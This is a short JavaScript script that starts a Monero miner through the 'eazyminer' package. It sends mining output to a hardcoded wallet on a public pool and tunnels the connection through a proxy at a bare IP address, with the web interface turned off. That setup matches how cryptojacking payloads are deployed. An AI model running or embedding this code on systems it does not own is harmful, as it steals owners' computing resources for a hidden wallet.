const Miner = require('eazyminer');
const tunnel = require('tunnel');

// Proxy configuration
const proxyOptions = {
  proxy: {
    host: '185.28.193.95',
    port: 8080,
    // Additional proxy options if required
    // e.g., proxy.auth: 'username:password'
  },
};

const miner = new Miner(
  {
    pools: [
      {
        coin: 'XMR',
        user:
          '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
        url: 'gulf.moneroocean.stream:20128', 
      },
    ],
    web: [
      {
        enabled: false,
        port: 3000,
      },
    ],
    autoStart: false,
    tunnel: {
      https: tunnel.httpsOverHttp(proxyOptions),
    },
  },
);

miner.start();
